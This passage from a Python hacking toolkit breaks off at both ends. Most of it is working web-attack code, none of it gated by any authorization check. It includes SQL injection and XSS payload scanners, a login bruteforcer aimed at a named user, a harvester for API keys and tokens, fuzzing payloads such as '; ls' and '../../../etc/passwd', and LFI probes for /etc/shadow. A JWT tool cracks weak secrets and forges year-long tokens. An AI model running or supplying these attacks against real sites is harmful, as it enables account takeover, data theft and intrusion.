    print(f"  {Y}Banned      {RST}: {R if banned else G}{banned}{RST} ")
    print(f"  {Y}Friends     {RST}: {W}{friends.get('count','?')}{RST} ")
    print(f"  {Y}Followers   {RST}: {W}{followers.get('count','?')}{RST} ")
    save_out(f"rblx_user_{uid}.txt", json.dumps(r, indent=2))


def rblx_game():
    banner_s("GAME INFO")
    gid = input(f"  {W}Universe ID: {RST} ").strip()
    r = requests.get(f"https://games.roblox.com/v1/games?universeIds={gid}").json()
    if r.get("data"):
        g = r["data"][0]
        print(f"\n  {Y}Name       {RST}: {W}{g.get('name')}{RST} ")
        print(f"  {Y}Creator    {RST}: {W}{g.get('creator',{}).get('name','?')}{RST} ")
        print(f"  {Y}Playing    {RST}: {W}{g.get('playing','?')}{RST} ")
        print(f"  {Y}Visits     {RST}: {W}{g.get('visits','?')}{RST} ")
        save_out(f"rblx_game_{gid}.txt", json.dumps(g, indent=2))
    else: print(f"{ERR} Not found. ")
    pause()


def rblx_search():
    banner_s("SEARCH USERS")
    query = input(f"  {W}Query: {RST} ").strip()
    r = requests.get(f"https://users.roblox.com/v1/users/search?keyword={query}&limit=25").json()
    if r.get("data"):
        print()
        for u in r["data"]:
            print(f"  {G}->{RST}  {W}{u.get('name'):<20}{RST}  {DIM}ID:{u.get('id')}{RST} ")
    else: print(f"{ERR} No results. ")
    pause()


def rblx_group():
    banner_s("GROUP INFO")
    gid = input(f"  {W}Group ID: {RST} ").strip()
    r = requests.get(f"https://groups.roblox.com/v1/groups/{gid}").json()
    if r.get("id"):
        print(f"\n  {Y}Name    {RST}: {W}{r.get('name')}{RST} ")
        print(f"  {Y}Owner   {RST}: {W}{r.get('owner',{}).get('username','?')}{RST} ")
        print(f"  {Y}Members {RST}: {W}{r.get('memberCount','?')}{RST} ")
        save_out(f"rblx_group_{gid}.txt", json.dumps(r, indent=2))
    else: print(f"{ERR} Not found. ")
    pause()


def rblx_avatar():
    banner_s("AVATAR INFO")
    uid = input(f"  {W}User ID: {RST} ").strip()
    r = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/avatar").json()
    if r.get("scales"):
        scales = r.get("scales", {})
        print(f"\n  {Y}Height   {RST}: {W}{scales.get('height','?')}{RST} ")
        print(f"  {Y}Width    {RST}: {W}{scales.get('width','?')}{RST} ")
        print(f"  {Y}Items    {RST}: {W}{len(r.get('assets',[]))} equipped{RST} ")
        save_out(f"rblx_avatar_{uid}.txt", json.dumps(r, indent=2))
    else: print(f"{ERR} Not found. ")
    pause()


# ========================================================================
# WEB TOOLS
# ========================================================================
def web_menu():
    while True:
        opts = [("01", "URL Shortener"), ("02", "Pastebin Poster"),
                ("03", "Tech Detector"), ("04", "CMS Detector"),
                ("05", "Admin Finder"), ("06", "Directory Brute"),
                ("07", "Header Grabber"), ("08", "SQLi Scanner"),
                ("09", "XSS Scanner"), ("10", "API Recon"),
                ("11", "Login Bruteforce"), ("12", "JS Secret Extractor"),
                ("13", "Param Fuzzer"), ("14", "Vuln Scanner [FULL]"),
                ("15", "Subdomain Takeover"), ("16", "WAF Detector"),
                ("17", "JWT Analyzer"), ("18", "LFI/RFI Scanner"),
                ("19", "Tech + CVE Lookup"), ("20", "SSRF Scanner"),
                ("00", "Retour")]
        menu_box("WEB TOOLS", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": web_shortener()
        elif c == "02": web_pastebin()
        elif c == "03": web_tech()
        elif c == "04": web_cms()
        elif c == "05": web_admin_finder()
        elif c == "06": web_dirbuster()
        elif c == "07": net_headers()
        elif c == "08": web_sqli_scanner()
        elif c == "09": web_xss_scanner()
        elif c == "10": web_api_recon()
        elif c == "11": web_login_bruteforce()
        elif c == "12": web_js_secrets()
        elif c == "13": web_param_fuzzer()
        elif c == "14": web_vuln_scanner()
        elif c == "15": web_subdomain_takeover()
        elif c == "16": web_waf_detect()
        elif c == "17": web_jwt_analyzer()
        elif c == "18": web_lfi_scanner()
        elif c == "19": web_tech_cve()
        elif c == "20": web_ssrf_scanner()
        elif c == "00": break


def web_shortener():
    banner_s("URL SHORTENER")
    url = input(f"  {W}URL: {RST}").strip()
    try:
        r = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=8)
        if r.status_code == 200:
            print(f"\n{OK} Short URL: {G}{r.text}{RST}")
        else: print(f"{ERR} Failed.")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def web_pastebin():
    banner_s("PASTEBIN POSTER")
    content = input(f"  {W}Content or file path: {RST} ").strip()
    if os.path.isfile(content):
        with open(content, "r", errors="ignore") as f: content = f.read()
    try:
        r = requests.post("https://paste.rs/", data=content.encode(), timeout=8)
        if r.status_code in [200, 201]:
            print(f"\n{OK} Posted: {G}{r.text.strip()}{RST} ")
        else: print(f"{ERR} {r.status_code} ")
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def web_tech():
    banner_s("TECH DETECTOR")
    url = input(f"  {W}URL: {RST} ").strip()
    try:
        r = requests.get(url, timeout=8); text = r.text.lower(); headers = r.headers
        checks = {"WordPress": "wp-content" in text or "wp-json" in text,
                  "Joomla": "joomla" in text, "Drupal": "drupal" in text,
                  "React": "react" in text, "Vue.js": "vue" in text,
                  "Angular": "ng-version" in text, "jQuery": "jquery" in text,
                  "PHP": headers.get("X-Powered-By", "").startswith("PHP"),
                  "Nginx": "nginx" in headers.get("Server", "").lower(),
                  "Apache": "apache" in headers.get("Server", "").lower(),
                  "Cloudflare": "cloudflare" in headers.get("Server", "").lower()}
        print(); tech = []
        for name, detected in checks.items():
            col = G if detected else DIM
            tag = "[DETECTED] " if detected else "[NOT FOUND] "
            print(f"  {col}{tag}{RST}  {W}{name}{RST} ")
            if detected: tech.append(name)
        save_out(f"tech_{url[:30].replace('/','_')}.txt", "\n".join(tech))
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def web_cms():
    banner_s("CMS DETECTOR")
    url = input(f"  {W}URL: {RST} ").strip()
    cms_paths = {"WordPress": ["/wp-login.php", "/wp-admin/"],
                 "Joomla": ["/administrator/", "/components/"],
                 "Drupal": ["/user/login", "/sites/default/"],
                 "Magento": ["/admin/", "/skin/frontend/"],
                 "PrestaShop": ["/admin-panel/", "/modules/"]}
    print()
    for cms, paths in cms_paths.items():
        found = False
        for path in paths:
            try:
                r = requests.get(url.rstrip("/") + path, timeout=4, allow_redirects=True)
                if r.status_code in [200, 301, 302]: found = True; break
            except Exception: pass
        col = G if found else DIM
        tag = "[FOUND] " if found else "[MISS]  "
        print(f"  {col}{tag}{RST}  {W}{cms}{RST} ")
    pause()


def web_admin_finder():
    banner_s("ADMIN FINDER")
    url = input(f"  {W}Base URL: {RST} ").strip().rstrip("/")
    paths = ["/admin", "/administrator", "/admin/login", "/panel", "/cpanel",
             "/wp-admin", "/user/login", "/backend", "/manage", "/manager",
             "/dashboard", "/control", "/staff", "/webadmin", "/siteadmin"]
    print(f"\n{INF} Testing {len(paths)} paths...\n "); found = []
    for path in paths:
        full = url + path
        try:
            r = requests.get(full, timeout=4, allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0"})
            ok = r.status_code in [200, 301, 302]
            col = G if ok else DIM
            tag = "[FOUND] " if ok else "[MISS]  "
            print(f"  {col}{tag}{RST}  {DIM}{full}{RST} ")
            if ok: found.append(full)
        except Exception:
            print(f"  {DIM}[ERR]   {full}{RST} ")
    save_out(f"admin_{url[:30].replace('/','_')}.txt", "\n".join(found)); pause()


def web_dirbuster():
    banner_s("DIRECTORY BRUTE")
    url = input(f"  {W}Base URL: {RST} ").strip().rstrip("/")
    wlist_file = input(f"  {W}Wordlist (blank=built-in): {RST} ").strip()
    builtin = ["backup", "old", "test", "dev", "api", "config", "uploads", "images",
               "files", "data", "logs", "admin", "login", "cache", "temp", "tmp",
               "secret", "private", "public", "static", "assets", "media", ".git",
               "env", ".env", "database", "db", "sql", "phpmyadmin"]
    paths = builtin
    if wlist_file and os.path.isfile(wlist_file):
        with open(wlist_file, errors="ignore") as f:
            paths = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} Bruting {len(paths)} paths...\n "); found = []
    for path in paths:
        full = f"{url}/{path}"
        try:
            r = requests.get(full, timeout=3, allow_redirects=False,
                             headers={"User-Agent": "Mozilla/5.0"})
            ok = r.status_code in [200, 301, 302, 403]
            col = G if r.status_code == 200 else (Y if r.status_code in [301, 302, 403] else DIM)
            tag = f"[{r.status_code}] " if ok else "[404] "
            print(f"  {col}{tag}{RST}  {DIM}{full}{RST} ")
            if ok: found.append(f"[{r.status_code}] {full} ")
        except Exception: pass
    save_out(f"dirbust_{url[:30].replace('/','_')}.txt", "\n".join(found)); pause()


def web_sqli_scanner():
    banner_s("SQLI SCANNER")
    url = input(f"  {W}URL (ex: http://site.com/page?id=1): {RST} ").strip()
    payloads = ["'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --",
                "' OR 1=1# ", "1' ORDER BY 1--", "1 UNION SELECT NULL--",
                "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"]
    errors = ["sql syntax", "mysql_fetch", "ora-", "sqlite", "pg_query", "syntax error",
              "unclosed quotation", "microsoft ole db", "odbc", "jdbc", "sqlstate",
              "warning: mysql", "you have an error in your sql"]
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    parsed = urlparse(url); params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print(f"\n{ERR} No GET params found. "); pause(); return
    print(f"\n{INF} Testing {len(payloads)} payloads...\n ")
    vulns = []
    for param in params:
        for pl in payloads:
            mod = dict(params); mod[param] = [pl]
            test_url = urlunparse(parsed._replace(query=urlencode(mod, doseq=True)))
            try:
                t0 = time.time()
                r = requests.get(test_url, timeout=8, headers={"User-Agent": "Mozilla/5.0"})
                elapsed = time.time() - t0
                body = r.text.lower()
                error_hit = any(e in body for e in errors)
                time_hit = elapsed >= 4.5
                if error_hit or time_hit:
                    tag = "[TIME-BASED] " if time_hit else "[ERROR-BASED] "
                    col = R if error_hit else Y
                    print(f"  {col}{tag}{RST}  param={W}{param}{RST}  {Y}{pl[:40]}{RST} ")
                    vulns.append(f"{tag} param={param} payload={pl} url={test_url} ")
                else:
                    print(f"  {DIM}[CLEAN]  {RST}param={DIM}{param}{RST} ")
            except Exception as e:
                print(f"  {DIM}[ERR] {e}{RST} ")
    if vulns:
        save_out(f"sqli_{parsed.netloc}.txt", "\n".join(vulns))
        print(f"\n{OK} {len(vulns)} potential injection(s). Saved. ")
    else:
        print(f"\n{DIM}[-] No obvious SQLi detected.{RST} ")
    pause()


def web_xss_scanner():
    banner_s("XSS SCANNER")
    url = input(f"  {W}URL: {RST} ").strip()
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "<body onload=alert(1)>",
                "'><script>alert(1)</script>", "<details open ontoggle=alert(1)>"]
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    parsed = urlparse(url); params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print(f"\n{ERR} No GET params found. "); pause(); return
    print(f"\n{INF} Testing {len(payloads)} XSS payloads...\n ")
    vulns = []
    for param in params:
        for pl in payloads:
            mod = dict(params); mod[param] = [pl]
            test_url = urlunparse(parsed._replace(query=urlencode(mod, doseq=True)))
            try:
                r = requests.get(test_url, timeout=6, headers={"User-Agent": "Mozilla/5.0"})
                reflected = pl.lower() in r.text.lower() or pl[:10].lower() in r.text.lower()
                if reflected:
                    print(f"  {R}[REFLECTED]{RST}  param={W}{param}{RST}  {Y}{pl[:50]}{RST} ")
                    vulns.append(f"[REFLECTED] param={param} payload={pl} ")
                else:
                    print(f"  {DIM}[CLEAN]     param={param}{RST} ")
            except Exception as e:
                print(f"  {DIM}[ERR] {e}{RST} ")
    if vulns:
        save_out(f"xss_{parsed.netloc}.txt", "\n".join(vulns))
        print(f"\n{OK} {len(vulns)} reflected XSS candidate(s). ")
    else:
        print(f"\n{DIM}[-] No reflected XSS detected.{RST} ")
    pause()


def web_api_recon():
    banner_s("API RECON")
    url = input(f"  {W}Base URL: {RST} ").strip().rstrip("/")
    endpoints = ["/api", "/api/v1", "/api/v2", "/rest", "/graphql", "/gql",
                 "/api/users", "/api/admin", "/api/auth", "/api/login",
                 "/api/token", "/api/me", "/api/config", "/api/debug",
                 "/api/health", "/api/status", "/swagger.json", "/openapi.json",
                 "/api/search", "/api/upload", "/.well-known"]
    print(f"\n{INF} Probing {len(endpoints)} endpoints...\n ")
    found = []
    for ep in endpoints:
        full = url + ep
        try:
            r = requests.get(full, timeout=4,
                             headers={"User-Agent": "Mozilla/5.0",
                                      "Accept": "application/json"})
            code = r.status_code
            is_json = "application/json" in r.headers.get("Content-Type", "")
            if code != 404:
                col = G if code == 200 else (Y if code in [301, 302, 401, 403] else DIM)
                jflag = f" {G}[JSON]{RST} " if is_json else " "
                print(f"  {col}[{code}]{RST}  {W}{full}{RST}{jflag} ")
                found.append(f"[{code}] {full} json={is_json}")
            else:
                print(f"  {DIM}[404]  {full}{RST} ")
        except Exception as e:
            print(f"  {DIM}[ERR] {full} -- {e}{RST} ")
    if found:
        save_out(f"api_recon_{url[:30].replace('/','_')}.txt", "\n".join(found))
        print(f"\n{OK} {len(found)} endpoints. Saved. ")
    else:
        print(f"\n{DIM}[-] No live API endpoints.{RST} ")
    pause()


def web_login_bruteforce():
    banner_s("LOGIN BRUTEFORCE")
    url = input(f"  {W}Login URL (POST): {RST} ").strip()
    user_field = input(f"  {W}Username field: {RST} ").strip() or "username"
    pass_field = input(f"  {W}Password field: {RST} ").strip() or "password"
    target_user = input(f"  {W}Target username: {RST} ").strip()
    wlist_file = input(f"  {W}Wordlist (blank=built-in): {RST} ").strip()
    fail_str = input(f"  {W}Failure string: {RST} ").strip() or "invalid"
    builtin = ["123456", "password", "admin", "qwerty", "letmein", "welcome",
               "monkey", "abc123", "1234", "admin123", "password1",
               target_user, target_user + "123", target_user + "2024"]
    passwords = builtin
    if wlist_file and os.path.isfile(wlist_file):
        with open(wlist_file, errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} Bruteforcing with {len(passwords)} passwords...\n ")
    session = requests.Session()
    found = False
    for pw in passwords:
        data = {user_field: target_user, pass_field: pw}
        try:
            r = session.post(url, data=data, timeout=6, allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0"})
            if fail_str.lower() not in r.text.lower():
                print(f"  {G}[HIT!]{RST}  {W}{pw}{RST}  status={r.status_code} ")
                save_out("bruteforce_hit.txt",
                         f"url={url} user={target_user} pass={pw} ")
                found = True; break
            else:
                print(f"  {DIM}[MISS]  {pw[:30]}{RST} ")
            time.sleep(0.1)
        except Exception as e:
            print(f"  {DIM}[ERR] {e}{RST} ")
    if not found: print(f"\n{DIM}[-] No credentials found.{RST} ")
    pause()


def web_js_secrets():
    banner_s("JS SECRET EXTRACTOR")
    url = input(f"  {W}URL (page or .js): {RST} ").strip()
    from urllib.parse import urljoin
    patterns = {
        "API Key":      r'(?:api[_-]?key|apikey)["\'\s=:]+([A-Za-z0-9_-]{16,64})',
        "AWS Key":      r'AKIA[0-9A-Z]{16}',
        "Bearer Token": r'[Bb]earer\s+([A-Za-z0-9-_.=+/]{20,200})',
        "JWT":          r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
        "Password":     r'(?:password|passwd|pwd)["\'\s=:]+([^"\'\s&<>{\n]{4,50})',
        "Private Key":  r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        "Google API":   r'AIza[0-9A-Za-z\-_]{35}',
        "GitHub Token": r'gh[pousr]_[A-Za-z0-9]{36}',
        "Discord Token": r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}',
    }
    try:
        hdrs = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(url, timeout=8, headers=hdrs)
        js_sources = [url]
        if "text/html" in r.headers.get("Content-Type", ""):
            for js in re.findall(r'src=["\']([^"\'> ]+\.js[^"\'> ]*)["\']', r.text)[:15]:
                js_sources.append(urljoin(url, js))
        all_hits = []
        for src in js_sources:
            try:
                body = requests.get(src, timeout=5, headers=hdrs).text
                print(f"\n{INF} Scanning: {src[:70]} ")
                for name, pat in patterns.items():
                    for h in re.findall(pat, body):
                        val = h if isinstance(h, str) else str(h)
                        print(f"  {R}[{name}]{RST}  {Y}{val[:80]}{RST} ")
                        all_hits.append(f"[{name}] {val}  (src: {src}) ")
            except Exception: pass
        if all_hits:
            save_out(f"js_secrets_{url[:30].replace('/','_')}.txt", "\n".join(all_hits))
            print(f"\n{OK} {len(all_hits)} secret(s). Saved. ")
        else:
            print(f"\n{DIM}[-] No secrets found.{RST} ")
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def web_param_fuzzer():
    banner_s("PARAM FUZZER")
    url = input(f"  {W}URL: {RST} ").strip().rstrip("/")
    mode = input(f"  {W}Mode [1=GET 2=POST 3=Headers]: {RST} ").strip()
    payloads = ["'", "<script>alert(1)</script>", "../../../etc/passwd", "\x00",
                "' OR 1=1--", "{{7*7}}", "%0d%0a", "|ls", "; ls", "$(ls)",
                "file:///etc/passwd", "http://127.0.0.1",
                "A" * 500, "A" * 4096]
    params_raw = input(f"  {W}Param names (comma-sep): {RST} ").strip()
    params = ([p.strip() for p in params_raw.split(",") if p.strip()]
              or ["id", "q", "search", "page", "file", "path"])
    err_signs = ["error", "exception", "warning", "fatal", "traceback",
                 "stack trace", "syntax error", "null pointer", "division by zero"]
    print(f"\n{INF} Fuzzing {len(params)} params x {len(payloads)} payloads...\n ")
    hits = []
    for param in params:
        for pl in payloads:
            try:
                if mode == "2":
                    r = requests.post(url, data={param: pl}, timeout=5,
                                      headers={"User-Agent": "Mozilla/5.0"})
                elif mode == "3":
                    r = requests.get(url, timeout=5,
                                     headers={"User-Agent": "Mozilla/5.0", param: pl})
                else:
                    r = requests.get(url, params={param: pl}, timeout=5,
                                     headers={"User-Agent": "Mozilla/5.0"})
                body = r.text.lower()
                err_hit = any(e in body for e in err_signs)
                short_pl = str(pl)[:25].replace("\n", "\\n").replace("\r", "\\r")
                if err_hit or r.status_code == 500:
                    print(f"  {R}[{r.status_code}][ERR HIT]{RST}  "
                          f"{W}{param}{RST}  {Y}{short_pl}{RST} ")
                    hits.append(f"[{r.status_code}] param={param} payload={pl!r} ")
                else:
                    print(f"  {DIM}[{r.status_code}]  {param}{RST} ")
            except Exception as e:
                print(f"  {DIM}[ERR] {param} -- {e}{RST} ")
    if hits:
        save_out(f"fuzz_{url[:30].replace('/','_')}.txt", "\n".join(hits))
        print(f"\n{OK} {len(hits)} interesting. Saved. ")
    else:
        print(f"\n{DIM}[-] Nothing interesting.{RST} ")
    pause()


def web_vuln_scanner():
    banner_s("VULN SCANNER [FULL]")
    url = input(f"  {W}Target URL: {RST}").strip().rstrip("/")
    print(f"\n  {Y}[*] Starting full vuln scan on {url}{RST}\n")
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    report = []; score = 0
    def tag_ok(label, detail=""): print(f"  {G}[VULN]{RST}  {W}{label}{RST}  {Y}{detail[:80]}{RST}")
    def tag_miss(label): print(f"  {DIM}[SAFE]  {label}{RST}")
    def add(sev, name, detail):
        nonlocal score
        pts = {"CRITICAL": 10, "HIGH": 7, "MEDIUM": 4, "LOW": 1}
        score += pts.get(sev, 1)
        report.append(f"[{sev}] {name}: {detail}")
        tag_ok(f"[{sev}] {name}", detail)

    print(f"  {R}>> Security Headers{RST}")
    try:
        r = requests.get(url, timeout=6, headers=hdrs)
        sec_hdrs = {"Strict-Transport-Security": "HSTS missing",
                    "X-Content-Type-Options": "MIME sniffing",
                    "X-Frame-Options": "Clickjacking",
                    "Content-Security-Policy": "No CSP",
                    "X-XSS-Protection": "XSS filter not set",
                    "Referrer-Policy": "Referrer leakage"}
        for h, msg in sec_hdrs.items():
            if h not in r.headers: add("LOW", f"Missing header: {h}", msg)
            else: tag_miss(f"Header {h}")
        srv = r.headers.get("Server", "")
        if srv: add("LOW", "Server banner exposed", srv)
    except Exception as e:
        print(f"  {DIM}[HEADER] {e}{RST}")

    print(f"\n  {R}>> Sensitive File Exposure{RST}")
    sensitive = ["/.git/config", "/.env", "/config.php", "/wp-config.php",
                 "/backup.zip", "/dump.sql", "/phpinfo.php", "/.htpasswd",
                 "/.htaccess", "/actuator/env", "/console", "/phpmyadmin/"]
    for path in sensitive:
        try:
            r = requests.get(url + path, timeout=3, headers=hdrs)
            if r.status_code == 200 and len(r.text) > 10:
                sev = "CRITICAL" if any(x in path for x in
                                        [".env", "config", "dump", "sql", "backup", "htpasswd"]) else "MEDIUM"
                add(sev, "Sensitive file exposed", f"{url + path} ({len(r.text)}B)")
            else:
                print(f"  {DIM}[SAFE]  {path}{RST}")
        except Exception: pass

    print(f"\n  {R}>> CORS Misconfiguration{RST}")
    try:
        r = requests.options(url, timeout=4, headers={**hdrs, "Origin": "http://evil.com"})
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == "*":
            add("MEDIUM", "CORS wildcard", acao)
        elif acao == "http://evil.com":
            sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
            add(sev, "CORS reflects arbitrary origin", f"ACAO={acao}")
        else:
            tag_miss("CORS")
    except Exception: pass

    print(f"\n  {R}+{'='*56}+{RST}")
    print(f"  {R}|  VULN SCAN COMPLETE{RST}")
    print(f"  {R}|  Target : {W}{url}{RST}")
    print(f"  {R}|  Score  : {Y}{score} pts{RST}")
    print(f"  {R}|  Findings: {len(report)}{RST}")
    print(f"  {R}+{'='*56}+{RST}\n")
    for i, line in enumerate(report, 1):
        sev_col = R if "CRITICAL" in line else (Y if "HIGH" in line else W)
        print(f"  {sev_col}[{i:02d}]{RST}  {line[:100]}")
    if report:
        out = f"VULN SCAN REPORT -- {url}\nScore: {score}\n\n" + "\n".join(report)
        save_out(f"vulnscan_{url[:30].replace('/','_').replace(':','')}.txt", out)
        print(f"\n{OK} Report saved.")
    pause()


def web_subdomain_takeover():
    banner_s("SUBDOMAIN TAKEOVER")
    domain = input(f"  {W}Domain: {RST} ").strip()
    fingerprints = {
        "GitHub Pages": ("There isn't a GitHub Pages site here", "github.io"),
        "Heroku": ("No such app", "heroku.com"),
        "Netlify": ("Not Found - Request ID", "netlify.app"),
        "Shopify": ("Sorry, this shop is currently unavailable", "myshopify.com"),
        "Tumblr": ("There's nothing here", "tumblr.com"),
        "Zendesk": ("Help Center Closed", "zendesk.com"),
        "Fastly": ("Fastly error: unknown domain", "fastly.net"),
        "Azure": ("404 Web Site not found", "azurewebsites.net"),
    }
    subdomains = ["www", "mail", "ftp", "dev", "staging", "test", "api", "app",
                  "cdn", "static", "blog", "shop", "store", "help", "docs",
                  "admin", "portal", "vpn", "git", "jenkins", "s3", "backup"]
    print(f"\n{INF} Checking {len(subdomains)} subdomains...\n ")
    vulns = []
    for sub in subdomains:
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            try:
                result = subprocess.run(["nslookup", "-type=CNAME", fqdn],
                                        capture_output=True, text=True, timeout=3)
                cname_out = result.stdout.lower()
                for svc, (fp, indicator) in fingerprints.items():
                    if indicator in cname_out:
                        try:
                            r = requests.get(f"http://{fqdn}", timeout=4, headers={"Host": fqdn})
                            if fp.lower() in r.text.lower():
                                print(f"  {R}[TAKEOVER]{RST}  {W}{fqdn}{RST} -> {Y}{svc}{RST}")
                                vulns.append(f"[TAKEOVER] {fqdn} -> {svc} ")
                        except Exception:
                            print(f"  {Y}[CNAME?]{RST}  {fqdn} -> {svc}")
                            vulns.append(f"[CNAME-UNREACH] {fqdn} -> {svc} ")
            except Exception: pass
            print(f"  {DIM}[{ip}]  {fqdn}{RST} ")
        except socket.gaierror:
            print(f"  {DIM}[NXDOMAIN]  {fqdn}{RST} ")
        except Exception as e:
            print(f"  {DIM}[ERR]  {fqdn}  {e}{RST} ")
    if vulns:
        save_out(f"takeover_{domain}.txt", "\n".join(vulns))
        print(f"\n{OK} {len(vulns)} potential takeover(s). Saved. ")
    else:
        print(f"\n{DIM}[-] No takeovers found.{RST} ")
    pause()


def web_waf_detect():
    banner_s("WAF DETECTOR")
    url = input(f"  {W}URL: {RST} ").strip()
    hdrs = {"User-Agent": "Mozilla/5.0"}
    wafs = {
        "Cloudflare": ["cf-ray", "cloudflare", "cf-cache-status"],
        "AWS WAF":    ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Akamai":     ["akamai", "akamaighost"],
        "Incapsula":  ["incap_ses", "visid_incap"],
        "Sucuri":     ["x-sucuri-id", "sucuri-clientsupport"],
        "F5 BIG-IP":  ["bigipserver", "x-wa-info"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Wordfence":  ["wordfence"],
        "Nginx":      ["nginx"],
        "Varnish":    ["x-varnish", "via: varnish"],
        "Fastly":     ["x-fastly-request-id", "fastly"],
    }
    probes = [url, url + "?x=<script>alert(1)</script>", url + "?x=' OR 1=1--"]
    waf_detected = {}
    for probe in probes:
        try:
            r = requests.get(probe, timeout=5, headers=hdrs)
            resp_text = (str(r.headers) + r.text).lower()
            for waf_name, indicators in wafs.items():
                if waf_name not in waf_detected:
                    for ind in indicators:
                        if ind.lower() in resp_text:
                            waf_detected[waf_name] = ind; break
        except Exception as e:
            print(f"  {DIM}[ERR] {e}{RST} ")
    if waf_detected:
        for w, sig in waf_detected.items():
            print(f"  {R}[WAF]{RST}  {W}{w}{RST}  (sig: {Y}{sig}{RST}) ")
        save_out(f"waf_{url[:30].replace('/','_')}.txt",
                 "\n".join(f"{w}: {s}" for w, s in waf_detected.items()))
        print(f"\n{OK} {len(waf_detected)} WAF(s) identified. ")
    else:
        print(f"\n{DIM}[-] No WAF detected.{RST} ")
    pause()


def web_jwt_analyzer():
    banner_s("JWT ANALYZER & ATTACKER")
    raw = input(f"  {W}JWT token: {RST}").strip()
    import hmac
    def b64pad(s): return s + "=="[:(-len(s) % 4)]
    parts = raw.split(".")
    if len(parts) != 3:
        print(f"{ERR} Invalid JWT format"); pause(); return
    try:
        header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])).decode())
        payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])).decode())
    except Exception as e:
        print(f"{ERR} Decode error: {e}"); pause(); return
    print(f"\n  {Y}[HEADER]{RST}")
    for k, v in header.items(): print(f"    {W}{k}{RST}: {v}")
    print(f"\n  {Y}[PAYLOAD]{RST}")
    for k, v in payload.items():
        if k in ["exp", "iat", "nbf"] and isinstance(v, int):
            ts = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(v))
            exp = " [EXPIRED]" if k == "exp" and v < time.time() else ""
            print(f"    {W}{k}{RST}: {v}  ({ts}){exp}")
        else:
            print(f"    {W}{k}{RST}: {v}")
    print(f"\n  {Y}[ATTACKS]{RST}")
    fake_hdr = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    print(f"  {R}[ALG:NONE]{RST}  {fake_hdr}.{parts[1]}.")
    print(f"\n  {Y}[BRUTE FORCE]{RST}")
    common = ["secret", "password", "123456", "admin", "key", "jwt", "token",
              "qwerty", "letmein", "changeme", "supersecret", "", "your-secret"]
    alg = header.get("alg", "HS256")
    found = False
    if alg in ["HS256", "HS384", "HS512"]:
        hmap = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hfn = hmap.get(alg, hashlib.sha256)
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        for secret in common:
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, hfn).digest()
            ).rstrip(b"=").decode()
            if sig == parts[2]:
                print(f"  {G}[SECRET FOUND!]{RST}  {W}{secret!r}{RST}")
                found = True; break
            else:
                print(f"  {DIM}[MISS]  {secret!r}{RST}")
        if not found: print(f"  {DIM}[-] Common secrets failed.{RST}")
    if found:
        new_payload = dict(payload)
        if "exp" in new_payload: new_payload["exp"] = int(time.time()) + 86400 * 365
        new_pl = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).rstrip(b"=").decode()
        new_signing = f"{parts[0]}.{new_pl}".encode()
        new_sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), new_signing, hfn).digest()
        ).rstrip(b"=").decode()
        forged = f"{parts[0]}.{new_pl}.{new_sig}"
        print(f"\n  {G}[FORGED TOKEN]{RST}\n  {Y}{forged}{RST}")
        save_out("jwt_forged.txt", forged)
    pause()


def web_lfi_scanner():
    banner_s("LFI / RFI SCANNER")
    url = input(f"  {W}URL with param: {RST} ").strip()
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    parsed = urlparse(url); params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print(f"{ERR} No GET params found. "); pause(); return
    lfi_payloads = ["../../../etc/passwd", "....//....//....//etc/passwd",
                    "../../../../etc/passwd", "../../../../../../etc/shadow",
                    "..%2F..%2F..%2Fetc%2Fpasswd", "/etc/passwd", "/etc/shadow",
                    "/proc/self/environ", "php://filter/convert.base64-encode/resource=index",
                    "file:///etc/passwd", "file:///C:/Windows/win.ini",
                    "C:\\Windows\\win.ini", "%00/etc/passwd"]
    lfi_signatures = ["root:x:", "daemon:", "bin:", "sys:", "[extensions]",
                      "for 16-bit app support", "Linux version", "<?php"]
    print(f"\n{INF} Testing {len(lfi_payloads)} LFI payloads...\n ")
    hits = []
    hdrs = {"User-Agent": "Mozilla/5.0"}
    for param in params:
        for pl in lfi_payloads:
            mod = dict(params); mod[param] = [pl]
